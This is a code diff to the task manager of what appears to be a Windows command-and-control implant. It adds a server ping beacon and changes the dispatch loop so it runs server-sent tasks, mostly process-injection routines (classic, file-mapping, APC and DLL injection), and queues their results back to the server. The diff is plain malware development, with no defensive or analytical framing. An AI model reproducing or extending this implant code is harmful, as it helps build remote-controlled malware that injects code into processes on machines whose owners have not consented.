@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include <stdio.h>
 #include "TaskManager.h"
 #include "Task.h"
 #include "../Definitions.h"
@@ -6,13 +7,15 @@
 
 TaskHandler handles[] = 
 {
+    pingServer,
     initAgentId,
-
     injectViaClassicProcessTask,
     injectViaFileMappingTask,
     injectViaApcTask,
     injectViaDllTask
 };
+
+void _processMessage(PTASK_MANAGER pTaskManager);
 
 PTASK_MANAGER initTaskManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_QUEUE queueMessagesToSend)
 {
@@ -30,35 +33,48 @@ BOOL destroyTaskManager(PTASK_MANAGER pTaskManager)
     return TRUE;
 };
 
-void processMessage(PTASK_MANAGER pTaskManager)
+
+void processMessageThread(PPROCESS_MESSAGE_ARGS args)
+{
+    _processMessage(args->pTaskManager);
+};
+
+void _processMessage(PTASK_MANAGER pTaskManager)
 {
     while(pTaskManager->running)
     {
         PMESSAGE messageReceive = pop(pTaskManager->queueMessageReceived);
         if(messageReceive == NULL)
         {
+            printf("[+] Sending ping message...\n");
             PMESSAGE messageToSend = pingServer(); // Prepare PING message to server
             push(pTaskManager->queueMessagesToSend, messageToSend); // Push PING message to message to send queue
             Sleep(pTaskManager->sleepTime); // SLEEP while message is sended
         }
         else
         {
-            performTask(messageReceive);
+            PMESSAGE messageToSend = performTask(messageReceive);
+            if(messageToSend == NULL)
+            {
+                break;
+            }
+            push(pTaskManager->queueMessagesToSend, messageToSend);
         }
     }
 };
 
-void performTask(PMESSAGE message)
+PMESSAGE performTask(PMESSAGE message)
 {
     DWORD type = (DWORD)message->type;
     if(type >= TASK_ARRAY_UPPER_BOUNDARY)
     {
-        return;
+        return NULL;
     }
 
     PBYTE payload = message->payload;
     TaskHandler handler = handles[type];
-    handler(payload);
+    PMESSAGE messageToSend = handler(payload);
     freeMessage(message);
+    return messageToSend;
 };
 
